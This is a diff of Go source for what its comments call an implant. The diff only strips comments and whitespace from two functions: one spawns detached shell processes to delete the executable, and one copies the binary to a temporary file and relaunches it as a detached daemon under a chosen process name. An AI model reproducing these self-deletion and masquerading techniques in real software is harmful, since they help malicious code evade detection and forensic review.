@@ -3,8 +3,8 @@
 package main
 
 import (
-	"crypto/rand"  
-	"encoding/hex" 
+	"crypto/rand"
+	"encoding/hex"
 	"fmt"
 	"os"
 	"os/exec"
@@ -26,12 +26,12 @@ func linuxScheduleSelfDeleteGrandchild(selfExePath string, originalLauncherPath 
 
 		cmd := exec.Command("sh", "-c", deleterCmdScript)
 		cmd.SysProcAttr = &syscall.SysProcAttr{
-			Setsid: true, // Detach from the current session, run independently.
+			Setsid: true,
 		}
 		err := cmd.Start()
 		if err == nil {
 			go func() {
-				_ = cmd.Wait() // Reap the child process
+				_ = cmd.Wait()
 			}()
 		}
 	}
@@ -41,21 +41,18 @@ func linuxScheduleSelfDeleteGrandchild(selfExePath string, originalLauncherPath 
 
 	cmdSelf := exec.Command("sh", "-c", deleterCmdScriptSelf)
 	cmdSelf.SysProcAttr = &syscall.SysProcAttr{
-		Setsid: true, // Detach from the current session, run independently.
+		Setsid: true,
 	}
 
-	err := cmdSelf.Start() // Note: This `err` shadows the one from the previous block, which is fine.
+	err := cmdSelf.Start()
 	if err == nil {
-		// Instead of Releasing, Wait for the process in a new goroutine
-		// to prevent it from becoming a zombie if the parent (implant) is still running.
+
 		go func() {
-			_ = cmdSelf.Wait() // Reap the child process
+			_ = cmdSelf.Wait()
 		}()
 	}
 
 }
-
-//
 
 func linuxRelaunchAsDaemon(originalLauncherExecutablePath string, argsForNewProcess []string, targetArgv0Name string, bgEnvMarkerKey string, origPathEnvKey string, origPathEnvValue string) error {
 
@@ -71,7 +68,7 @@ func linuxRelaunchAsDaemon(originalLauncherExecutablePath string, argsForNewProc
 		return fmt.Errorf("failed to read original executable '%s': %v", originalLauncherExecutablePath, err)
 	}
 
-	err = os.WriteFile(tempFileName, inputBytes, 0700) // rwx------
+	err = os.WriteFile(tempFileName, inputBytes, 0700)
 	if err != nil {
 		return fmt.Errorf("failed to write temporary executable '%s': %v", tempFileName, err)
 	}
@@ -89,7 +86,7 @@ func linuxRelaunchAsDaemon(originalLauncherExecutablePath string, argsForNewProc
 
 	err = cmd.Start()
 	if err != nil {
-		// If starting fails, try to clean up the temporary file
+
 		_ = os.Remove(tempFileName)
 		return fmt.Errorf("failed to start detached process from '%s' as '%s': %v", tempFileName, targetArgv0Name, err)
 	}
